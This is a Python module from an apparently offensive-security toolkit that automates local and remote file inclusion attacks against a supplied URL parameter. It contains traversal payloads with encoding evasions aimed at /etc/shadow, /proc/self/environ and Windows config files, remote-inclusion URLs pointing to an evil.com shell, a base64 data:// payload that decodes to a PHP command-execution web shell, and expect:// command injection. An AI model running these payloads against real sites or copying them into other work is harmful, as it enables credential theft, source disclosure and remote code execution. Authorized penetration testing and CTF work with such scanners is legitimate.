# -*- coding: utf-8 -*-
"""
MEOW-SEC :: LFI — Local / Remote File Inclusion Tester
For authorized security testing and CTF challenges only.
"""
import os, re, json, time
from datetime import datetime
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse, urljoin

from core.ui import (console, ok, err, info, warn, find, boot_progress,
                     print_result_table, show_module_banner, ask_target,
                     ask_choice, G1, G2, CY, OR, RD, DM)
from core.cats import CAT_FOUND, CAT_SCAN, cat_talk
from rich.prompt import Prompt

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

from core.proxy_manager import px as _px

# ─── PAYLOADS ─────────────────────────────────────────────────
LFI_LINUX = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/etc/hostname",
    "/proc/self/environ",
    "/proc/version",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
]

LFI_WIN = [
    "C:/Windows/win.ini",
    "C:/boot.ini",
    "C:/Windows/System32/drivers/etc/hosts",
    "C:/inetpub/wwwroot/web.config",
]

TRAVERSAL = [
    "",                   # plain
    "../" * 3,
    "../" * 5,
    "../" * 7,
    "..%2F" * 3,
    "..%2F" * 5,
    "%2e%2e%2f" * 3,
    "%2e%2e%2f" * 5,
    "....//....//....//",
    "..././..././..././",
    "%252e%252e%252f" * 3,  # double encode
    "..%c0%af" * 3,         # unicode slash
]

RFI_URLS = [
    "http://evil.com/shell.php",
    "//evil.com/shell.php",
    "ftp://evil.com/shell.php",
]

PHP_WRAPPERS = [
    "php://filter/read=convert.base64-encode/resource=index.php",
    "php://filter/read=convert.base64-encode/resource=config.php",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
    "expect://id",
    "zip://shell.jpg%23shell.php",
]

# Signatures to detect successful inclusion
SIGNATURES = {
    "/etc/passwd":          r"root:.*:/bin/",
    "/etc/hosts":           r"127\.0\.0\.1",
    "/proc/self/environ":   r"PATH=",
    "/proc/version":        r"Linux version",
    "win.ini":              r"\[fonts\]",
    "boot.ini":             r"\[boot",
    "web.config":           r"<configuration",
    "php://filter":         r"[A-Za-z0-9+/]{20,}={0,2}",  # base64
}

def _detect(text: str, path: str) -> bool:
    for key, pattern in SIGNATURES.items():
        if key.lower() in path.lower():
            if re.search(pattern, text, re.I):
                return True
    return False

def _req(url: str, param: str, payload: str):
    if not HAS_REQUESTS:
        return None
    parsed = urlparse(url)
    qs     = parse_qs(parsed.query)
    qs[param] = [payload]
    new_qs = urlencode({k: v[0] for k, v in qs.items()})
    new_url = urlunparse(parsed._replace(query=new_qs))
    try:
        r = requests.get(new_url, timeout=8, verify=False, proxies=_px(),
                         allow_redirects=True,
                         headers={"User-Agent": "MEOW-LFI/1.1 (authorized-test)"})
        return r
    except Exception:
        return None

def _run_lfi(url: str, param: str, files: list) -> list:
    findings = []
    total = len(TRAVERSAL) * len(files)
    done  = 0
    for traversal in TRAVERSAL:
        for fpath in files:
            payload = traversal + fpath
            r = _req(url, param, payload)
            done += 1
            if r and _detect(r.text, fpath):
                findings.append({"param": param, "payload": payload,
                                  "file": fpath, "len": len(r.text), "status": r.status_code})
                find(f"LFI [{CY}]{param}[/] → [{G1}]{fpath}[/]  payload: {payload[:50]}")
            elif r:
                info(f"  [{done}/{total}] {payload[:60]:<60}  [{DM}]{r.status_code}[/]")
    return findings

def _run_wrappers(url: str, param: str) -> list:
    findings = []
    for wrapper in PHP_WRAPPERS:
        r = _req(url, param, wrapper)
        if r:
            hit = False
            if "php://filter" in wrapper and re.search(r"[A-Za-z0-9+/]{30,}={0,2}", r.text):
                hit = True
            elif len(r.text) > 100 and r.status_code == 200:
                hit = True
            if hit:
                findings.append({"param": param, "payload": wrapper,
                                  "type": "PHP_WRAPPER", "status": r.status_code})
                find(f"PHP Wrapper [{CY}]{param}[/] → [{G1}]{wrapper[:60]}[/]")
    return findings

def _get_params(url: str) -> list:
    qs = parse_qs(urlparse(url).query)
    return list(qs.keys())

def run(target: str = None):
    show_module_banner("lfi")
    cat_talk(CAT_SCAN, "LFI sensors active — probing file inclusion points...", RD)
    console.print()

    if not target:
        target = ask_target("Target URL with parameters (https://site.com/page.php?file=home)")
    if not target:
        err("No target."); return

    if not target.startswith("http"):
        target = "https://" + target

    params = _get_params(target)
    if not params:
        warn("No GET parameters detected in URL.")
        param = Prompt.ask(f"  [{CY}]Enter parameter name manually[/]").strip()
        if not param:
            err("No parameter."); return
        params = [param]
    else:
        info(f"Parameters found: [{CY}]{', '.join(params)}[/]")

    console.print()
    console.print(f"  [{G1}][1][/] LFI — Linux paths (/etc/passwd, /proc/...)")
    console.print(f"  [{G1}][2][/] LFI — Windows paths (win.ini, boot.ini...)")
    console.print(f"  [{G1}][3][/] LFI — Full (Linux + Windows)")
    console.print(f"  [{G1}][4][/] PHP Wrappers (php://filter, data://, expect://)")
    console.print(f"  [{G1}][5][/] All of the above")
    mode = ask_choice("Mode", "1")

    files = []
    if mode in ("1", "3", "5"): files += LFI_LINUX
    if mode in ("2", "3", "5"): files += LFI_WIN
    if mode in ("4", "5"):      files = []  # wrappers only in those modes

    warn("Use ONLY on authorized targets. Unauthorized testing is illegal.")
    console.print()
    boot_progress(["Loading payloads...", "Generating traversal sequences...", "Scanning parameters..."])
    console.print()

    all_findings = []
    for param in params:
        info(f"Testing parameter: [{CY}]{param}[/]")
        if mode in ("1", "2", "3", "5"):
            all_findings += _run_lfi(target, param, files)
        if mode in ("4", "5"):
            all_findings += _run_wrappers(target, param)

    console.print()
    if all_findings:
        rows = [(f["param"], f["payload"][:40], f.get("file", f.get("type","?")), f.get("status","?"))
                for f in all_findings]
        print_result_table("LFI Findings", ["PARAM", "PAYLOAD", "FILE/TYPE", "STATUS"], rows)
    else:
        ok("No LFI vulnerabilities detected.")

    _save(target, all_findings)

def _save(target, findings):
    out = os.path.join(os.path.dirname(__file__), "..", "data")
    os.makedirs(out, exist_ok=True)
    fname = os.path.join(out, f"lfi_{urlparse(target).netloc.replace('.','_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
    with open(fname, "w", encoding="utf-8") as f:
        json.dump({"target": target, "findings": findings, "time": datetime.now().isoformat()}, f, indent=2)
    ok(f"Results saved → [{CY}]{os.path.basename(fname)}[/]")
